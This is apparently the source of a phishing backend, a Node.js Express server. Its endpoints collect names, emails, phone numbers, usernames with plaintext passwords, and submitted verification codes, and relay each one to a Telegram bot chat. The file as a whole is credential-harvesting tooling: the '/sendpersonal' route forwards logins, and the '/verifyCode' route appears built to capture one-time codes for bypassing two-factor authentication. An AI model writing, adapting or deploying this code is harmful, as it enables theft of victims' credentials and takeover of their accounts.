import express from 'express';
import axios from 'axios';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.status(200).json({ message: 'Backend is running' });
});

async function sendTelegramMessage(text) {
  return axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    chat_id: process.env.CHAT_ID,
    text,
  });
}

app.post('/send', async (req, res) => {
  const { fullname, email, phone } = req.body;
  console.log("Received data:", req.body);

  if (!fullname || !email || !phone) {
    res.setHeader('Content-Type', 'application/json');
    return res.status(400).json({ success: false, message: 'All fields are required' });
  }

  const message = `New User Details:\n\nFull Name: ${fullname}\nEmail: ${email}\nPhone: ${phone}`;

  try {
    await sendTelegramMessage(message);
    console.log('Telegram Token:', process.env.TELEGRAM_TOKEN?.slice(0, 10) + '...');
    console.log('Chat ID:', process.env.CHAT_ID);

    res.setHeader('Content-Type', 'application/json');
    res.status(200).json({ success: true, message: 'Message sent successfully' });
  } catch (error) {
    console.error('Error sending message:', error.response?.data || error.message);
    res.status(500).json({ error: 'Failed to send message' });
  }
});

app.post('/sendpersonal', async (req, res) => {
  const { username, password } = req.body;
  console.log("📥 Received data:", req.body);

  if (!username || !password) {
    console.log("❌ Missing fields");
    return res.status(400).json({ success: false, message: 'username and password required' });
  }

  const message = `New login:\nUsername: ${username}\nPassword: ${password}`;

  try {
    const response = await sendTelegramMessage(message);
    console.log("✅ Message sent to Telegram:", response.data);

    return res.status(200).json({ success: true, message: 'Message sent successfully' });
  } catch (error) {
    console.error("❌ Telegram error:", error.response?.data || error.message);
    return res.status(500).json({ error: 'Failed to send message' });
  }
});

app.post('/verifyCode', async (req, res) => {
   const { code } = req.body;
  console.log("Received code:", code);

   if (!code) {
    res.setHeader('Content-Type', 'application/json');
    return res.status(400).json({ success: false, message: 'Code is required' });
  }

 const message = `User submitted code: ${code}`;

  try {
    await sendTelegramMessage(message);
    console.log('Telegram Token:', process.env.TELEGRAM_TOKEN?.slice(0, 10) + '...');
    console.log('Chat ID:', process.env.CHAT_ID);

    res.setHeader('Content-Type', 'application/json');
    res.status(200).json({ success: true, message: 'Message sent successfully' });
  } catch (error) {
    console.error('Error sending message:', error.response?.data || error.message);
    res.status(500).json({ error: 'Failed to send message' });
  }
});




app.listen(PORT, () => {
  console.log(`Backend is running on http://localhost:${PORT}`);
});
